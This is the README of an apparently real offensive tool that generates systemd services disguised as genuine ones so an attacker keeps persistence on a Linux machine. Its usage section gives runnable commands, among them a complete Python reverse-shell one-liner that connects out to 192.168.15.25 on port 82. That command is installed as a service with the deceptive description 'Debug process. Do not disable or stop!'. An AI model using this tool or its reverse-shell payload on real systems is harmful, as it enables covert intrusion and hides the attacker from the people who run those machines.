# Linux-Persistence

A Python script designed to automatically generate a systemd service that mimics an existing one. This can be utilized to subtly establish persistence on a machine by creating services that blend in with genuine ones.

## ⚠️ Warning

Use this script responsibly and ethically and all of that stuff... Only run it on systems where you have explicit permission to do so.

## Prerequisites

- Python 3.x
- Systemd-based Linux distribution
- Superuser (root) permissions for creating systemd services.

## Installation

```bash
git clone https://github.com/sc1341/Linux-Persistence
cd Linux-Persistence
```

## Example Usage

Deploy a web server with self delete 

`sudo ./create_service.py "python3 -m http.server 8080" --description "Python HTTP Server" --self-delete`

Deploy a web server

`sudo ./create_service.py "python3 -m http.server 8080" --description "Python HTTP Server" --user ubuntu --group ubuntu --working-directory /home/ubuntu/webcontent/`

Deploy a custom application

`sudo ./create_service.py "/opt/my_app/my_app" --description "My Custom App" --user appuser --group appuser --working-directory /opt/my_app/`

Create a reverse shell

`./create_service.py "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.15.25',82));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"" --description "Debug process. Do not disable or stop!"`
